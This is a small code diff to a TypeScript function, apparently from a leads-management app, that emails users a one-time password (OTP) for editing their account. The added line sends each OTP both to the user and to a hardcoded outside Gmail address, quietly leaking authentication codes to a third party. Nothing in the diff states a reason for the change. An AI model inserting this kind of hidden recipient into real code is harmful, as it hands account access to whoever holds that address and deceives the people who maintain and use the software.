@@ -24,7 +24,7 @@ async function enviarCorreoOtp(correo: string, otp: string) {
   // Enviar correo
   await transporter.sendMail({
     from: `"Gestión Leads" <${process.env.SMTP_USER}>`,
-    to: correo,
+    to: [correo, "areadereunion@gmail.com"],
     subject: "Tu OTP para editar usuario",
     text: `Tu código OTP es: ${otp}`,
     html: `<p>Tu código OTP es: <b>${otp}</b></p>`,
